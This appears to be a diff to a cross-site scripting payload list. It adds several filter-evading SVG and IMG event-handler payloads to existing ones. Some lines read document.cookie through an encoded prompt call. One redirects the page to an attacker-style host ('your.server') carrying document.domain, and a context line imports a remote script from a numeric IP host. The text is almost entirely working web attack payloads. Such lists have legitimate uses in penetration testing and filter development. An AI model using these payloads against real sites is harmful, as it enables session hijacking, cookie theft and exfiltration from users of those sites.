@@ -12,5 +12,10 @@ javascript:{ alert`0` }
 <img src=x onError=import('//1152848220/')>
 %2sscript%2ualert()%2s/script%2u
 <svg on onload=(alert)(document.domain)>
-
+<img ignored=() src=x onerror=prompt(1)>
+<svg onx=() onload=(confirm)(1)>
+“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<svg on =i onload=alert(domain)
+<svg/onload=location/**/='https://your.server/'+document.domain>
+<svg onx=() onload=window.alert?.()>
 
